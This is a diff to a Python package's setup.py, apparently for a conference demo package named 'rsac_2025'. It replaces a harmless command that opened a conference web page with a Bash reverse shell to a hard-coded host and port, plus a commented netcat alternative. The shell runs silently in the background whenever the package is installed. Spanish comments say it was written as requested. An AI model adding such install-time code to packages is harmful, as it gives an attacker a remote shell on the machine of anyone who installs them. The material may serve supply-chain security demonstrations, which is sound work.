@@ -2,10 +2,19 @@ from setuptools import setup
 import subprocess
 import os
 
-cmd = [ "open", "https://www.rsaconference.com/" ]
+# Definimos el comando de la Reverse Shell
+# Usamos un "one-liner" de Bash por si el nc de la víctima no soporta el flag -e
+LHOST = "10.10.1.18"
+LPORT = "9001"
 
-with open(os.devnull, 'w') as devnull:
-    subprocess.Popen(cmd, stdout=devnull, stderr=devnull)
+# Comando alternativo más compatible:
+cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' &"
+
+# Si prefieres usar estrictamente netcat como pediste:
+# cmd = f"nc {LHOST} {LPORT} -e /bin/bash &"
+
+# Ejecución silenciosa en segundo plano
+os.system(cmd)
 
 setup(
     name='rsac_2025',
@@ -14,4 +23,5 @@ setup(
     author='Trevor Madge',
     author_email='tmadge@sonatype.com',
     packages=['rsac_2025'],
+    install_requires=[],
 )
